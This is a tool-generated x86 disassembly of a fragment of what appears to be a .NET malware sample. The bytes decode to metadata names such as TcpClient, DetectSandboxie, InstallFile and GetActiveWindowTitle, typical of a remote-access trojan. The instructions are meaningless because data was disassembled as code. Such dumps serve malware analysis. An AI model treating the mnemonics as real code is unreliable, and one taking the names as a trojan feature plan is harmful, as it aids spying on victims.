  407c6f:	74 3e                	je     0x407caf
  407c71:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  407c75:	61                   	popa
  407c76:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c79:	6e                   	outsb  %ds:(%esi),(%dx)
  407c7a:	67 46                	addr16 inc %esi
  407c7c:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  407c83:	73 6c                	jae    0x407cf1
  407c85:	43                   	inc    %ebx
  407c86:	6c                   	insb   (%dx),%es:(%edi)
  407c87:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407c8e:	5f                   	pop    %edi
  407c8f:	42                   	inc    %edx
  407c90:	61                   	popa
  407c91:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407c94:	6e                   	outsb  %ds:(%esi),(%dx)
  407c95:	67 46                	addr16 inc %esi
  407c97:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  407c9e:	63 70 43             	arpl   %esi,0x43(%eax)
  407ca1:	6c                   	insb   (%dx),%es:(%edi)
  407ca2:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  407ca9:	5f                   	pop    %edi
  407caa:	42                   	inc    %edx
  407cab:	61                   	popa
  407cac:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  407caf:	6e                   	outsb  %ds:(%esi),(%dx)
  407cb0:	67 46                	addr16 inc %esi
  407cb2:	69 65 6c 64 00 49 6e 	imul   $0x6e490064,0x6c(%ebp),%esp
  407cb9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cba:	65 72 41             	gs jb  0x407cfe
  407cbd:	64 64 4d             	fs fs dec %ebp
  407cc0:	61                   	popa
  407cc1:	70 43                	jo     0x407d06
  407cc3:	68 69 6c 64 00       	push   $0x646c69
  407cc8:	49                   	dec    %ecx
  407cc9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cca:	6e                   	outsb  %ds:(%esi),(%dx)
  407ccb:	65 72 41             	gs jb  0x407d0f
  407cce:	64 64 41             	fs fs inc %ecx
  407cd1:	72 72                	jb     0x407d45
  407cd3:	61                   	popa
  407cd4:	79 43                	jns    0x407d19
  407cd6:	68 69 6c 64 00       	push   $0x646c69
  407cdb:	68 57 6e 64 00       	push   $0x646e57
  407ce0:	53                   	push   %ebx
  407ce1:	65 6e                	outsb  %gs:(%esi),(%dx)
  407ce3:	64 00 41 70          	add    %al,%fs:0x70(%ecx)
  407ce7:	70 65                	jo     0x407d4e
  407ce9:	6e                   	outsb  %ds:(%esi),(%dx)
  407cea:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  407cee:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  407cf5:	61 
  407cf6:	6c                   	insb   (%dx),%es:(%edi)
  407cf7:	75 65                	jne    0x407d5e
  407cf9:	4b                   	dec    %ebx
  407cfa:	69 6e 64 00 52 65 70 	imul   $0x70655200,0x64(%esi),%ebp
  407d01:	6c                   	insb   (%dx),%es:(%edi)
  407d02:	61                   	popa
  407d03:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d06:	43                   	inc    %ebx
  407d07:	72 65                	jb     0x407d6e
  407d09:	61                   	popa
  407d0a:	74 65                	je     0x407d71
  407d0c:	49                   	dec    %ecx
  407d0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407d0e:	73 74                	jae    0x407d84
  407d10:	61                   	popa
  407d11:	6e                   	outsb  %ds:(%esi),(%dx)
  407d12:	63 65 00             	arpl   %esp,0x0(%ebp)
  407d15:	73 65                	jae    0x407d7c
  407d17:	74 5f                	je     0x407d78
  407d19:	4d                   	dec    %ebp
  407d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d1b:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  407d20:	6c                   	insb   (%dx),%es:(%edi)
  407d21:	65 4d                	gs dec %ebp
  407d23:	6f                   	outsl  %ds:(%esi),(%dx)
  407d24:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  407d29:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  407d30:	64 65 
  407d32:	00 45 6e             	add    %al,0x6e(%ebp)
  407d35:	74 65                	je     0x407d9c
  407d37:	72 44                	jb     0x407d7d
  407d39:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407d3d:	4d                   	dec    %ebp
  407d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  407d3f:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  407d44:	79 70                	jns    0x407db6
  407d46:	74 6f                	je     0x407db7
  407d48:	53                   	push   %ebx
  407d49:	74 72                	je     0x407dbd
  407d4b:	65 61                	gs popa
  407d4d:	6d                   	insl   (%dx),%es:(%edi)
  407d4e:	4d                   	dec    %ebp
  407d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  407d50:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  407d55:	6d                   	insl   (%dx),%es:(%edi)
  407d56:	70 72                	jo     0x407dca
  407d58:	65 73 73             	gs jae 0x407dce
  407d5b:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  407d62:	00 43 69             	add    %al,0x69(%ebx)
  407d65:	70 68                	jo     0x407dcf
  407d67:	65 72 4d             	gs jb  0x407db7
  407d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d6b:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  407d70:	6c                   	insb   (%dx),%es:(%edi)
  407d71:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  407d76:	64 65 00 75 74       	fs add %dh,%gs:0x74(%ebp)
  407d7b:	66 38 45 6e          	data16 cmp %al,0x6e(%ebp)
  407d7f:	63 6f 64             	arpl   %ebp,0x64(%edi)
  407d82:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  407d87:	65 74 65             	gs je  0x407def
  407d8a:	53                   	push   %ebx
  407d8b:	75 62                	jne    0x407def
  407d8d:	4b                   	dec    %ebx
  407d8e:	65 79 54             	gs jns 0x407de5
  407d91:	72 65                	jb     0x407df8
  407d93:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407d97:	74 5f                	je     0x407df8
  407d99:	4d                   	dec    %ebp
  407d9a:	65 73 73             	gs jae 0x407e10
  407d9d:	61                   	popa
  407d9e:	67 65 00 44 65       	add    %al,%gs:0x65(%si)
  407da3:	74 65                	je     0x407e0a
  407da5:	63 74 53 61          	arpl   %esi,0x61(%ebx,%edx,2)
  407da9:	6e                   	outsb  %ds:(%esi),(%dx)
  407daa:	64 62 6f 78          	bound  %ebp,%fs:0x78(%edi)
  407dae:	69 65 00 49 6e 76 6f 	imul   $0x6f766e49,0x0(%ebp),%esp
  407db5:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  407db9:	45                   	inc    %ebp
  407dba:	6e                   	outsb  %ds:(%esi),(%dx)
  407dbb:	75 6d                	jne    0x407e2a
  407dbd:	65 72 61             	gs jb  0x407e21
  407dc0:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  407dc4:	49                   	dec    %ecx
  407dc5:	44                   	inc    %esp
  407dc6:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  407dcd:	6c                   	insb   (%dx),%es:(%edi)
  407dce:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  407dd3:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd4:	75 62                	jne    0x407e38
  407dd6:	6c                   	insb   (%dx),%es:(%edi)
  407dd7:	65 00 53 77          	add    %dl,%gs:0x77(%ebx)
  407ddb:	61                   	popa
  407ddc:	70 44                	jo     0x407e22
  407dde:	6f                   	outsl  %ds:(%esi),(%dx)
  407ddf:	75 62                	jne    0x407e43
  407de1:	6c                   	insb   (%dx),%es:(%edi)
  407de2:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407de6:	74 5f                	je     0x407e47
  407de8:	48                   	dec    %eax
  407de9:	61                   	popa
  407dea:	6e                   	outsb  %ds:(%esi),(%dx)
  407deb:	64 6c                	fs insb (%dx),%es:(%edi)
  407ded:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407df1:	6e                   	outsb  %ds:(%esi),(%dx)
  407df2:	74 69                	je     0x407e5d
  407df4:	6d                   	insl   (%dx),%es:(%edi)
  407df5:	65 46                	gs inc %esi
  407df7:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  407dfe:	64 6c                	fs insb (%dx),%es:(%edi)
  407e00:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e04:	74 4d                	je     0x407e53
  407e06:	6f                   	outsl  %ds:(%esi),(%dx)
  407e07:	64 75 6c             	fs jne 0x407e76
  407e0a:	65 48                	gs dec %eax
  407e0c:	61                   	popa
  407e0d:	6e                   	outsb  %ds:(%esi),(%dx)
  407e0e:	64 6c                	fs insb (%dx),%es:(%edi)
  407e10:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407e14:	6e                   	outsb  %ds:(%esi),(%dx)
  407e15:	74 69                	je     0x407e80
  407e17:	6d                   	insl   (%dx),%es:(%edi)
  407e18:	65 54                	gs push %esp
  407e1a:	79 70                	jns    0x407e8c
  407e1c:	65 48                	gs dec %eax
  407e1e:	61                   	popa
  407e1f:	6e                   	outsb  %ds:(%esi),(%dx)
  407e20:	64 6c                	fs insb (%dx),%es:(%edi)
  407e22:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407e26:	74 54                	je     0x407e7c
  407e28:	79 70                	jns    0x407e9a
  407e2a:	65 46                	gs inc %esi
  407e2c:	72 6f                	jb     0x407e9d
  407e2e:	6d                   	insl   (%dx),%es:(%edi)
  407e2f:	48                   	dec    %eax
  407e30:	61                   	popa
  407e31:	6e                   	outsb  %ds:(%esi),(%dx)
  407e32:	64 6c                	fs insb (%dx),%es:(%edi)
  407e34:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  407e38:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  407e3f:	65 
  407e40:	00 57 72             	add    %dl,0x72(%edi)
  407e43:	69 74 65 53 69 6e 67 	imul   $0x6c676e69,0x53(%ebp,%eiz,2),%esi
  407e4a:	6c 
  407e4b:	65 00 54 6f 53       	add    %dl,%gs:0x53(%edi,%ebp,2)
  407e50:	69 6e 67 6c 65 00 53 	imul   $0x5300656c,0x67(%esi),%ebp
  407e57:	65 74 41             	gs je  0x407e9b
  407e5a:	73 53                	jae    0x407eaf
  407e5c:	69 6e 67 6c 65 00 49 	imul   $0x4900656c,0x67(%esi),%ebp
  407e63:	6e                   	outsb  %ds:(%esi),(%dx)
  407e64:	73 74                	jae    0x407eda
  407e66:	61                   	popa
  407e67:	6c                   	insb   (%dx),%es:(%edi)
  407e68:	6c                   	insb   (%dx),%es:(%edi)
  407e69:	46                   	inc    %esi
  407e6a:	69 6c 65 00 44 65 63 	imul   $0x6f636544,0x0(%ebp,%eiz,2),%ebp
  407e71:	6f 
  407e72:	64 65 46             	fs gs inc %esi
  407e75:	72 6f                	jb     0x407ee6
  407e77:	6d                   	insl   (%dx),%es:(%edi)
  407e78:	46                   	inc    %esi
  407e79:	69 6c 65 00 53 61 76 	imul   $0x65766153,0x0(%ebp,%eiz,2),%ebp
  407e80:	65 
  407e81:	42                   	inc    %edx
  407e82:	79 74                	jns    0x407ef8
  407e84:	65 73 54             	gs jae 0x407edb
  407e87:	6f                   	outsl  %ds:(%esi),(%dx)
  407e88:	46                   	inc    %esi
  407e89:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  407e90:	6e 
  407e91:	52                   	push   %edx
  407e92:	6f                   	outsl  %ds:(%esi),(%dx)
  407e93:	6c                   	insb   (%dx),%es:(%edi)
  407e94:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  407e98:	6e                   	outsb  %ds:(%esi),(%dx)
  407e99:	64 6f                	outsl  %fs:(%esi),(%dx)
  407e9b:	77 73                	ja     0x407f10
  407e9d:	42                   	inc    %edx
  407e9e:	75 69                	jne    0x407f09
  407ea0:	6c                   	insb   (%dx),%es:(%edi)
  407ea1:	74 49                	je     0x407eec
  407ea3:	6e                   	outsb  %ds:(%esi),(%dx)
  407ea4:	52                   	push   %edx
  407ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ea6:	6c                   	insb   (%dx),%es:(%edi)
  407ea7:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407eab:	74 41                	je     0x407eee
  407ead:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407eb1:	65 57                	gs push %edi
  407eb3:	69 6e 64 6f 77 54 69 	imul   $0x6954776f,0x64(%esi),%ebp
  407eba:	74 6c                	je     0x407f28
  407ebc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407ec0:	74 5f                	je     0x407f21
  407ec2:	4d                   	dec    %ebp
  407ec3:	61                   	popa
  407ec4:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  407ecb:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407ecf:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed0:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ed3:	73 4d                	jae    0x407f22
  407ed5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ed6:	64 75 6c             	fs jne 0x407f45
  407ed9:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407edd:	74 5f                	je     0x407f3e
  407edf:	57                   	push   %edi
  407ee0:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407ee7:	79 6c                	jns    0x407f55
  407ee9:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  407eed:	6f                   	outsl  %ds:(%esi),(%dx)
  407eee:	63 65 73             	arpl   %esp,0x73(%ebp)
  407ef1:	73 57                	jae    0x407f4a
  407ef3:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  407efa:	79 6c                	jns    0x407f68
  407efc:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f00:	74 5f                	je     0x407f61
  407f02:	4e                   	dec    %esi
  407f03:	61                   	popa
  407f04:	6d                   	insl   (%dx),%es:(%edi)
  407f05:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f09:	74 5f                	je     0x407f6a
  407f0b:	46                   	inc    %esi
  407f0c:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f13:	00 
  407f14:	73 65                	jae    0x407f7b
  407f16:	74 5f                	je     0x407f77
  407f18:	46                   	inc    %esi
  407f19:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f20:	00 
  407f21:	47                   	inc    %edi
  407f22:	65 74 54             	gs je  0x407f79
  407f25:	65 6d                	gs insl (%dx),%es:(%edi)
  407f27:	70 46                	jo     0x407f6f
  407f29:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f30:	00 
  407f31:	47                   	inc    %edi
  407f32:	65 74 46             	gs je  0x407f7b
  407f35:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  407f3c:	00 
  407f3d:	66 69 6c 65 4e 61 6d 	imul   $0x6d61,0x4e(%ebp,%eiz,2),%bp
  407f44:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  407f49:	6f                   	outsl  %ds:(%esi),(%dx)
  407f4a:	64 75 6c             	fs jne 0x407fb9
  407f4d:	65 4e                	gs dec %esi
  407f4f:	61                   	popa
  407f50:	6d                   	insl   (%dx),%es:(%edi)
  407f51:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f55:	74 5f                	je     0x407fb6
  407f57:	4d                   	dec    %ebp
  407f58:	61                   	popa
  407f59:	63 68 69             	arpl   %ebp,0x69(%eax)
  407f5c:	6e                   	outsb  %ds:(%esi),(%dx)
  407f5d:	65 4e                	gs dec %esi
  407f5f:	61                   	popa
  407f60:	6d                   	insl   (%dx),%es:(%edi)
  407f61:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f65:	74 5f                	je     0x407fc6
  407f67:	4f                   	dec    %edi
  407f68:	53                   	push   %ebx
  407f69:	46                   	inc    %esi
  407f6a:	75 6c                	jne    0x407fd8
  407f6c:	6c                   	insb   (%dx),%es:(%edi)
  407f6d:	4e                   	dec    %esi
  407f6e:	61                   	popa
  407f6f:	6d                   	insl   (%dx),%es:(%edi)
  407f70:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f74:	74 5f                	je     0x407fd5
  407f76:	46                   	inc    %esi
  407f77:	75 6c                	jne    0x407fe5
  407f79:	6c                   	insb   (%dx),%es:(%edi)
  407f7a:	4e                   	dec    %esi
  407f7b:	61                   	popa
  407f7c:	6d                   	insl   (%dx),%es:(%edi)
  407f7d:	65 00 49 73          	add    %cl,%gs:0x73(%ecx)
  407f81:	56                   	push   %esi
  407f82:	61                   	popa
  407f83:	6c                   	insb   (%dx),%es:(%edi)
  407f84:	69 64 44 6f 6d 61 69 	imul   $0x6e69616d,0x6f(%esp,%eax,2),%esp
  407f8b:	6e 
  407f8c:	4e                   	dec    %esi
  407f8d:	61                   	popa
  407f8e:	6d                   	insl   (%dx),%es:(%edi)
  407f8f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  407f93:	74 5f                	je     0x407ff4
  407f95:	55                   	push   %ebp
  407f96:	73 65                	jae    0x407ffd
  407f98:	72 4e                	jb     0x407fe8
  407f9a:	61                   	popa
  407f9b:	6d                   	insl   (%dx),%es:(%edi)
  407f9c:	65 00 6c 6f 77       	add    %ch,%gs:0x77(%edi,%ebp,2)
  407fa1:	65 72 4e             	gs jb  0x407ff2
  407fa4:	61                   	popa
  407fa5:	6d                   	insl   (%dx),%es:(%edi)
  407fa6:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  407faa:	74 4e                	je     0x407ffa
  407fac:	61                   	popa
  407fad:	6d                   	insl   (%dx),%es:(%edi)
  407fae:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  407fb2:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  407fb6:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb7:	73 74                	jae    0x40802d
  407fb9:	4e                   	dec    %esi
  407fba:	61                   	popa
  407fbb:	6d                   	insl   (%dx),%es:(%edi)
  407fbc:	65 00 6e 61          	add    %ch,%gs:0x61(%esi)
  407fc0:	6d                   	insl   (%dx),%es:(%edi)
  407fc1:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  407fc6:	65 54                	gs push %esp
  407fc8:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  407fcf:	5f                   	pop    %edi
  407fd0:	4c                   	dec    %esp
  407fd1:	61                   	popa
  407fd2:	73 74                	jae    0x408048
  407fd4:	57                   	push   %edi
  407fd5:	72 69                	jb     0x408040
  407fd7:	74 65                	je     0x40803e
  407fd9:	54                   	push   %esp
  407fda:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  407fe1:	6e                   	outsb  %ds:(%esi),(%dx)
  407fe2:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  407fe9:	54                   	push   %esp
  407fea:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  407ff1:	74 65                	je     0x408058
  407ff3:	4c                   	dec    %esp
  407ff4:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  407ffb:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407ffe:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  408002:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  408009:	6d                   	insl   (%dx),%es:(%edi)
  40800a:	65 54                	gs push %esp
  40800c:	79 70                	jns    0x40807e
  40800e:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408012:	74 5f                	je     0x408073
  408014:	56                   	push   %esi
  408015:	61                   	popa
  408016:	6c                   	insb   (%dx),%es:(%edi)
  408017:	75 65                	jne    0x40807e
  408019:	54                   	push   %esp
  40801a:	79 70                	jns    0x40808c
  40801c:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  408020:	6c                   	insb   (%dx),%es:(%edi)
  408021:	75 65                	jne    0x408088
  408023:	54                   	push   %esp
  408024:	79 70                	jns    0x408096
  408026:	65 00 4d 73          	add    %cl,%gs:0x73(%ebp)
  40802a:	67 50                	addr16 push %eax
  40802c:	61                   	popa
  40802d:	63 6b 54             	arpl   %ebp,0x54(%ebx)
  408030:	79 70                	jns    0x4080a2
  408032:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  408036:	6f                   	outsl  %ds:(%esi),(%dx)
  408037:	74 6f                	je     0x4080a8
  408039:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40803c:	54                   	push   %esp
  40803d:	79 70                	jns    0x4080af
  40803f:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  408043:	74 54                	je     0x408099
  408045:	79 70                	jns    0x4080b7
  408047:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  40804b:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  40804e:	74 54                	je     0x4080a4
  408050:	79 70                	jns    0x4080c2
  408052:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  408056:	6c                   	insb   (%dx),%es:(%edi)
  408057:	65 53                	gs push %ebx
  408059:	68 61 72 65 00       	push   $0x657261
  40805e:	53                   	push   %ebx
  40805f:	79 73                	jns    0x4080d4
  408061:	74 65                	je     0x4080c8
  408063:	6d                   	insl   (%dx),%es:(%edi)
  408064:	2e 43                	cs inc %ebx
  408066:	6f                   	outsl  %ds:(%esi),(%dx)
  408067:	72 65                	jb     0x4080ce
  408069:	00 53 65             	add    %dl,0x65(%ebx)
  40806c:	72 76                	jb     0x4080e4
  40806e:	65 72 73             	gs jb  0x4080e4
  408071:	69 67 6e 61 74 75 72 	imul   $0x72757461,0x6e(%edi),%esp
  408078:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  40807c:	6f                   	outsl  %ds:(%esi),(%dx)
  40807d:	73 65                	jae    0x4080e4
  40807f:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  408083:	70 6f                	jo     0x4080f4
  408085:	73 65                	jae    0x4080ec
  408087:	00 50 61             	add    %dl,0x61(%eax)
  40808a:	72 73                	jb     0x4080ff
  40808c:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408090:	72 52                	jb     0x4080e4
  408092:	65 76 65             	gs jbe 0x4080fa
  408095:	72 73                	jb     0x40810a
  408097:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  40809b:	30 39                	xor    %bh,(%ecx)
  40809d:	43                   	inc    %ebx
  40809e:	65 72 74             	gs jb  0x408115
  4080a1:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080a8:	00 56 61             	add    %dl,0x61(%esi)
  4080ab:	6c                   	insb   (%dx),%es:(%edi)
  4080ac:	69 64 61 74 65 53 65 	imul   $0x72655365,0x74(%ecx,%eiz,2),%esp
  4080b3:	72 
  4080b4:	76 65                	jbe    0x40811b
  4080b6:	72 43                	jb     0x4080fb
  4080b8:	65 72 74             	gs jb  0x40812f
  4080bb:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080c2:	00 63 65             	add    %ah,0x65(%ebx)
  4080c5:	72 74                	jb     0x40813b
  4080c7:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4080ce:	00 43 72             	add    %al,0x72(%ebx)
  4080d1:	65 61                	gs popa
  4080d3:	74 65                	je     0x40813a
  4080d5:	00 53 65             	add    %dl,0x65(%ebx)
  4080d8:	74 54                	je     0x40812e
  4080da:	68 72 65 61 64       	push   $0x64616572
  4080df:	45                   	inc    %ebp
  4080e0:	78 65                	js     0x408147
  4080e2:	63 75 74             	arpl   %esi,0x74(%ebp)
  4080e5:	69 6f 6e 53 74 61 74 	imul   $0x74617453,0x6e(%edi),%ebp
  4080ec:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080f1:	65 74 65             	gs je  0x408159
  4080f4:	00 43 61             	add    %al,0x61(%ebx)
  4080f7:	6c                   	insb   (%dx),%es:(%edi)
  4080f8:	6c                   	insb   (%dx),%es:(%edi)
  4080f9:	53                   	push   %ebx
  4080fa:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408101:	74 
  408102:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408106:	6d                   	insl   (%dx),%es:(%edi)
  408107:	70 69                	jo     0x408172
  408109:	6c                   	insb   (%dx),%es:(%edi)
  40810a:	65 72 47             	gs jb  0x408154
  40810d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40810f:	65 72 61             	gs jb  0x408173
  408112:	74 65                	je     0x408179
  408114:	64 41                	fs inc %ecx
  408116:	74 74                	je     0x40818c
  408118:	72 69                	jb     0x408183
  40811a:	62 75 74             	bound  %esi,0x74(%ebp)
  40811d:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  408122:	75 67                	jne    0x40818b
  408124:	67 61                	addr16 popa
  408126:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40812a:	74 74                	je     0x4081a0
  40812c:	72 69                	jb     0x408197
  40812e:	62 75 74             	bound  %esi,0x74(%ebp)
  408131:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  408135:	6d                   	insl   (%dx),%es:(%edi)
  408136:	56                   	push   %esi
  408137:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  40813e:	74 74                	je     0x4081b4
  408140:	72 69                	jb     0x4081ab
  408142:	62 75 74             	bound  %esi,0x74(%ebp)
  408145:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408149:	73 65                	jae    0x4081b0
  40814b:	6d                   	insl   (%dx),%es:(%edi)
  40814c:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408150:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  408157:	72 
  408158:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  40815f:	73 73                	jae    0x4081d4
  408161:	65 6d                	gs insl (%dx),%es:(%edi)
  408163:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408167:	72 61                	jb     0x4081ca
  408169:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  40816c:	61                   	popa
  40816d:	72 6b                	jb     0x4081da
  40816f:	41                   	inc    %ecx
  408170:	74 74                	je     0x4081e6
  408172:	72 69                	jb     0x4081dd
  408174:	62 75 74             	bound  %esi,0x74(%ebp)
  408177:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  40817c:	67 65 74 46          	addr16 gs je 0x4081c6
  408180:	72 61                	jb     0x4081e3
  408182:	6d                   	insl   (%dx),%es:(%edi)
  408183:	65 77 6f             	gs ja  0x4081f5
  408186:	72 6b                	jb     0x4081f3
  408188:	41                   	inc    %ecx
  408189:	74 74                	je     0x4081ff
  40818b:	72 69                	jb     0x4081f6
  40818d:	62 75 74             	bound  %esi,0x74(%ebp)
  408190:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408194:	73 65                	jae    0x4081fb
  408196:	6d                   	insl   (%dx),%es:(%edi)
  408197:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  40819b:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081a2:	69 
  4081a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4081a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4081a5:	41                   	inc    %ecx
  4081a6:	74 74                	je     0x40821c
  4081a8:	72 69                	jb     0x408213
  4081aa:	62 75 74             	bound  %esi,0x74(%ebp)
  4081ad:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081b1:	73 65                	jae    0x408218
  4081b3:	6d                   	insl   (%dx),%es:(%edi)
  4081b4:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ba:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c0:	74 69                	je     0x40822b
  4081c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c4:	41                   	inc    %ecx
  4081c5:	74 74                	je     0x40823b
  4081c7:	72 69                	jb     0x408232
  4081c9:	62 75 74             	bound  %esi,0x74(%ebp)
  4081cc:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d0:	73 65                	jae    0x408237
  4081d2:	6d                   	insl   (%dx),%es:(%edi)
  4081d3:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081d7:	65 73 63             	gs jae 0x40823d
  4081da:	72 69                	jb     0x408245
  4081dc:	70 74                	jo     0x408252
  4081de:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
